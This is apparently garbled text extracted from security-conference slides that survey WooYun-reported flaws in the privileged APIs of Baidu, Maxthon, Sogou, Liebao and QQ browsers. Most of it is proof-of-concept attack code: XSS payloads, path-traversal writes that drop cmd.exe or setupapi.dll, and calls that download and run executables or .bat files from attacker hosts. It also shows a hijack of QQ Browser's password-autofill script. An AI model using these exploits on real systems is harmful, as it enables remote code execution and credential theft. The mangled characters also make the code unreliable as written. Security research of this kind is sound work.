""
@gainover

 



ID:  gainover

 

 

Dota20+1

 :

 ....    PKAV    

""

WooYun--2014--080158 à

   h:p://xapp.baidu.com/

API   
window.external.StartRequest(222,"AppS ervice.AppMarket.DownloadPack","(func Von(id,res){alert(res)})","{\"ID\":\"Silenter \",\"UPDATE\":\"true\",\"URL\":\"h:p:// x.com/swf_collector.crx\"}",window,"");

Xss  Auditor
XSS   h:p://xapp.baidu.com/browserextension/ single/sinaweibo/ auth.php#access_token=<img  src=1   onerror=alert(1)>
]p://  IE   ]p://192.168.1.107/test/ bdbrowser.htm

WooYun--2014--80438 à

   h:p://xapp.baidu.com/   bdbrowser://   file://   data:   blob:

window.external.StartRequest(1," bdbrowser.skin.download","(funcVon(id,res) {console.log(res)})","{\"name\": \"1/../../../../../../../../../../../../../cmd.exe\", \"url\":\"hLp://192.168.1.105/testbaidu.exe \"}",window,"")
var  data='<script></script>';   var  blob=new  Blob([data],{"type":"text/html"});   (funcVon(){                 var  iframe=document.createElement("iframe");                   iframe.src=URL.createObjectURL(blob);                   document.body.appendChild(iframe);   })()

WooYun--2014--80910 à

window.external.StartRequest(1,"bdbrowser.skin.d

ownload","(funcVon(id,res)

{console.log(res)})","{\"name\":

\"1//..//..//..//..//..//..//..//test.js\",\"url\":

\"hLp://xapp.baidu.com/interface/

   h:p://xapp.baidu.com/   bdbrowser://   file://   data:  

lib.get_app_list_new?callback=JS
\"}",window,"") ]p://  IE   ]p://192.168.1.107/test/
bdbrowser2.htm

blob:

FileXSSUNC  path  

\\127.0.0.1/C$/Program  Files/baidu/baiduBrowser/resource/

extension/security/safe_default.html#path=aa<script/

defer>eval(window.name);</script>  

  

var  obj  =  queryHash(decodeURIComponent(locaVon.hash).replace("#",  

""));  

document.getElementById("path").innerHTML  =  obj.path;

WooYun--2014--80910 à

   h:p://xapp.baidu.com/

API   

URL

window.external.StartRequest(222,"AppS ervice.AppMarket.DownloadPack","(func Von(id,res){alert(res)})","{\"ID\":\"Silenter \",\"UPDATE\":\"false\",\"URL\": \"h:p://newsleLer.baidu.com/u.html? xxxxxxx&.crx\"}",window,"");

XSS   h:p://xapp.baidu.com/browserextension/ single/Veba/Vebarslidebar/v_6--0/ Vebaslidebar--login--confirm.html#! f=aaaa&uid=vvvvv&uname=<img  src=1   onerror=alert(1)>

WooYun--2014--83294 à

API

URL   data:text/html,biduwebdata

window.external.StartRequest(1058," set_string_pref","","[\"download_def ault_directory\",\""+dir+"\"]");      window.external.StartRequest(1059," set_boolean_pref","","[\"download_a uto_save\",true]");

h:p://

URL  XSS      file:///C:/xxxxxx#"><img/ src="1"/onerror="alert(1)">  

res:///C:/xxxxxx#"><img/src="1"/ onerror="alert(1)">

WooYun--2015--93620 à

      h:p://liulanqi.baidu.com/   h:p://bbs.liulanqi.baidu.com/

API
window.external.StartRequest(1058," set_string_pref","","[\"download_def ault_directory\",\""+dir+"\"]");      window.external.StartRequest(1059," set_boolean_pref","","[\"download_a uto_save\",true]");

XSSDOM  XSS      [url=h:p://pan.baidu.com/s/1dDgZov3?frm=fujian#%7B%22surl%22%3A %22s%2F1dDgZov3%3Ffrm%3Dfujian%22%2C%22sdate %22%3A1422007684%2C%22sname%22%3A%22<img  src   onerror=console.log(111111)>logo.png%22%2C%22isdir%22%3A0%2C %22uk%22%3A%222600757472%22%2C%22uname%22%3A%22abc %22%7D]logo.png[/url]

WooYun--2015--96413 à

h:p://bbs.liulanqi.baidu.com/
   h:p://chajian.baidu.com/app-- res.html

 ../
../../../../../../../../../Documents  and   Se|ngs/All  Users/// /calc.exe


var  f=document.createElement("iframe");f.src="h:p://chajian.baidu.com/app-- res.html";   f.onload=funcVon(){   f.contentWindow.postMessage('{"type":"install","data": {"id":"fpdnjdlbdmifoocedhkighhlbchbiikl","url":"h:p://dlsw.br.baidu.com/app/ 201410/1f457685544a52b101cc1f173adae6f8.crx","ext_url":"hLp://xsst.sinaapp.com/ poc/bd2.zip"}}','*');   };   document.body.appendChild(f);

""

WooYun--2014--82043 à

XSS   
      h:p://*.maxthon.cn/   mx://
XSS   mx://res/noVficaVon/saved/ index.htm    XSS   h:p://my.maxthon.cn//public/ images/swfupload.swf     

API   maxthon.browser.config.ConfigManager.set("maxth on.config",  "browser.general.mulVhomepage",   '["mx://res/noVficaVon/saved/ index.htm#a=1&url=1&dir=<svg  onload %3DFuncVon(URL)()>&\u2028var   s=document.createElement(\\\"script\\\");s.src=\\ \"h:p://192.168.0.115/mx/poc2.2.js\\ \";document.body.appendChild(s);"]')         maxthon.program.Program.launch("C:\\windows\ \system32\\calc.exe","");
   maxthon.system.Environment.getFo lderPath('Mx3data');
   external.mxCall('InstallSkin',  "h:p:// 192.168.0.115/mx/test.bat");

WooYun--2014--82227 à

contentWindow.maxthon.program  

      h:p://*.maxthon.cn/   mx://

mx://res/no`fica`on/     

API  
external.mxCall('Ins tallSkin',  "h:p://xss t.sinaapp.com/test /mx.bat")

h:p://192.168.1.13/mx/poc3.xml

iframe

XSS:
mx://res/app/%7B4F562E60--F24B--4728--A FDB--DA55CE1597FE%7D/preview.htm?hL p://192.168.1.13/mx/poc3.xml
h:p://sso.maxthon.cn/quit.php?host=www.007.mx



maxthon.io

maxthon.browser.con fig.ConfigManager.set

maxthon.program

external.mxCall

h:pXSS   *.maxthon.cn

API  

acmcx:e/s/sr/iens/dqeuxi.chkt--m  WooYun--2015--102497  
phith0n  

mx://XSS  


<Vtle> WooYun--2015--93544     

mx://res/opVons/index.htm


WooYun--2015--89801     Lyleaks


WooYun--2015--94814   Lyleaks

WooYun--2015--97165 à

      mx://

contentWindow.m axthon.program  

API  

contentWindow.external contentWindow.external.m .mxCall('InstallSkin',  ..)   xCall("InstallApp",  "...");  

h:p:// 192.168.1.13/ mx/poc3.xml

iframe       mx://res/noVficaVon/    

iframe       h:p://*.maxthon.cn  

XSS:
mx://res/app/%7B4F562E60--F24B--4728--A FDB--DA55CE1597FE%7D/preview.htm?h: p://192.168.1.13/mx/poc3.xml

RSS  Reader

maxthon.io        maxthon.program

clickjacking

RSS  Reader  XSS

XSS

 XSS

mx://res/app/%7B4F562E60--F 24B--4728--AFDB--DA55CE1597F E%7D/preview.htm?javascript: alert(locaVon.href)
WooYun--2015--105477   Lyleaks

WooYun--2015--114877       
WooYun--2015--0112901   WooYun--2015--114083   WooYun--2015--122123    


WooYun--2014--81919 

API
var  x=new   maxthon.browser.TabService();   x.openTabWithHistoryList(["h:p:/ /www.baidu.com"]);

<widget  #test  type="htmlarea"><include   src="file:///c:\windows\win.ini"  /></widget><img   #xx  src="11"  />   <style>   widget#test  >  text{   assigned!:$1(img#xx).src="h:p:// www.baidu.com/?"+self:value;color:red;   }   </style>


x.openTabWithHistoryList(["h:p:// www.baidu.com",null]);

HTML  +  CSSS User--agenthtmlayout  3.3;  



h:p://i.maxthon.cn/#<img   src=1  onerror=alert(1)>

""

WooYun--2014--83537 NPAPI  à  

      h:p://*.sogou.com/   se://  

se--extension://

h:p://

locaVon.href

WooYun--2013--37211   
APIexternal.SkinCall

DLL.  startExe

NPAPI   se--extension://ext740107210/html/b ack.html
Iframe  à  contentWindow XSS   se--extension://ext--1055834318/signin.ht ml?app=test&code=javascript:alert(1)

WooYun--2014--84110 NPAPI  à  

      se--extension://

h:p://

locaVon.href

DLL.  startExe
NPAPI   se--extension://ext740107210/html/b ack.html iframe window.open(..)  à  window XSS   se--extension://ext--1055834318/signin.ht ml?app=test&code=javascript:alert(1);// hLp://www.baidu.com/

WooYun--2014--85567 NPAPI  à  

      se--extension://

window.onmessage  =  funcVon(e)  {  

  var  data  =  e.data;  

  ...  

  

  sogouExplorer.tabs.create({  

  

  

  url:  data.url,  

  

  

  selected:  true  

  

  });  

  

  window.close();  

  ...  

postMessage

};

se--extension://ext740107210/html/balloon.html

h:p://

locaVon.href window.open

w=window.open('se--extension://ext7 40107210/html/balloon.html'); setTimeout(funcVon(){                     w.locaVon.href='se--extension:// ext740107210/html/balloon.html';   },500);
XSS   h:p://player.mbox.sogou.com/FlashMP3Player.swf

WooYun--2014--85567 NPAPI  à  

.postMessage({"cmd":"Balloo nStartGame","url":"javascript:alert(1) "},"*");
View  Page se--extension://ext740107210/ht ml/balloon.html  

CreateProcess(NULL,  lpCommandLine,..)
startExe("calc      ","",""); startExe("calc.exe          ","","");   startExe("calc.exe","","");   àcalc.exesogouminigamepacker.exe

sogouExplorer.runVme.getBa ckgroundPage()  à  window

DLL.  startExe

Background  Page
se--extension://ext740107210/ht ml/back.html  

WooYun--2015--89575 NPAPI--> à  

      se--extension://



h:p://

locaVon.href window.open 

sogouExplorer.run`me.getBackgroundPage(). document.getElementById("picdownloader").downloa d("h:p://xsst.sinaapp.com/poc/calc.exe","C:\ \Documents  and  Se|ngs\\Administrator\\ \\\\\\calc.exe",  funcVon(e){});
XSS   se--extension://ext--1588466412/v.html
var  f=document.createElement("a");f.target="_blank";f.hre f="se--extension://ext740107210/html/balloon.html";docu ment.body.appendChild(f);f.click();
API   window.external.extension("installExtFromSidebarBox",   "com.sogou.cxj009.PicViewer",  "1.0.6",  "test",  '--1',   'undefined',  'undefined',  "funcVon() {console.log(arguments);}"); XSS   h:p://ie.sogou.com/app/js/uploadify/uploadify.swf

WooYun--2015--97380 NPAPIà  

      se--extension://

DLL.  runProcess
se--extension://ext15485894/background.html
window.openàwindow
se--extension://ext--1588466412/v.html com.sogou.cxj009.PicViewer   XSS-->      (     <img  src  onerror=outerHTML=URL>

h:p:// 

window.open("se://sidebarextmanager/ index.html").external.extension("installExtFromSidebar Box",  ....);
Bypass  external  
XSS   h:p://v.sogou.com/vc/play/redirect.jsp?url=

WooYun--2015--114462 à  

com.sogou.cxj009.PicViewer DLL.  download

DLL.startExe

sogou.xml  à  com.sogou.gamecenter\\1.1.0\\manifest.xml   hehe.js              à  com.sogou.gamecenter\\1.1.0\\hehe.js  

content  script  

calcx.exe        à  com.sogou.gamecenter\\1.1.0\\sogouminigamepacker.exe  

<content_scripts>   <content_script>   <js>hehe.js</js>   <match>*://*/*</match>   </content_script>   </content_scripts>

  

<plugins>         <plugin  name="npGameCenterLite"  path="res/npGameCenterLite.dll"  public="true">         <mime_type>applicaVon/sogou--start--gamecenter--lite--plugin</mime_type>         </plugin>   </plugins>

""

WooYun--2015--97654  à  

DLL.Run2(downloadurl)

      *.liebao.cn   *.duba.com

<embed  pluginspage='h:p://www.fsmeeVng.com/download/f mloader.xpi'  id='fx_ClientLoader'  type='applicaVon/npcltloader --plugin'  hidden='true'  width='1'  height='1'/>


XSS   h:p://tuan.duba.com/ category/?city_code=

 





API:   external.NaVveInstallExtensions(["fpmcd bknonpdbngoboglidihcb~caep"]);

"QQ"

WooYun--2015--95664 à  

      *.qq.com  

JS
JS  

.qrx  ==  .zip DLL
../../../../../../../../../Progra m  Files/Tencent/QQBrow ser/setupapi.dll

JS

*.qq.com    XSS

API   window.external.extension.installExtension ("{CD36E3DB--304A--48EF--A8A2-- D873F608D2AE}","hLp://xxxx.qq.com/ AAAAAAAA.qrx","8.0.1.19",funcVon(){   alert("install  ok");   });

WooYun--2015--111199 

DOM  API

                 
Content  Script


document.documentElement.getA:ribute=funcVo n(a){                   alert(a);   }  

WooYun--2015--111199 

var  m=setTimeout;      window["setTimeout"]=funcVon(a,t){                      alert(a)                      m(a,t);      }





Content  ScriptsetTimeout

WooYun--2015--111199 
var  m=setTimeout;      window["setTimeout"]=funcVon(a,t){      alert(arguments.callee.caller)      m(a,t);      }
setTimeoutcaller
QQ

WooYun--2015--111199 

 GlobalVar
funcVon  handleInit(response){
GlobalVar.tabUrl  =  response.data.tabUrl;      GlobalVar.tabHostname  =  response.data.tabHostname;      GlobalVar.tabTitle  =  response.data.tabTitle;  


sendBG({                    cmd  :  "fill"      });

}
funcVon  sendBG(){
msg.Vtle  =  GlobalVar.tabTitle||document.Vtle;   msg.url  =  GlobalVar.tabUrl||window.locaVon.href;   msg.hostname  =  GlobalVar.tabHostname||window.locaVon.hostname;      qqbrowser.extension.sendMessage(msg,  funcVon(response)  {                           handleResponse(response);   }); }

WooYun--2015--111199 

  var  m=setTimeout;  

  eval("var  setTimeout;");  

  setTimeout=funcVon(a,t){  

  

  //

if((i++==  0)&&/^funcVon  handleInit/.test(arguments.callee.caller.toString())){  

  

  

  arguments.callee.caller({  

  

  

  

  "data":{  

  

  

  

  

  

  "bAutoFill":true,  

h     andleI     nit

     

     

     

  "bAutoSave":true,     "inExclusionList":false,  

  

  

  

  

  

  "tabUrl":"h:p://qzone.qq.com/",  

  

  

  

  

  

  "tabHostname":"qzone.qq.com",  

  

  

  

  

  

  "tabTitle":"hehehe",  

  

  

  

  

  

  "specialRule":null  

  

  

  

  

  }  

  

  

  });  

  

  }  

  

  m(a,t);  

  }  

WooYun--2015--111199 
var  JSON2=JSON;      var  JSON={};      JSON.parse=funcVon(a){                      alert(a);                        return  JSON2.parse(a);      };





h:p     API  API   SOP XSS

       

  

       

  

  QQ     























































  


 h:p:// .com

 h:p/h:ps/]p

iframe   locaVon.href   window.open   

 

 

 (file://)  

 (blob://)  

API

XSS/ external


WooYun--2014--60702   fate0

NPAPI  Fuzz



               

 

   DLL







  
   

 only_guest  




PKAV  

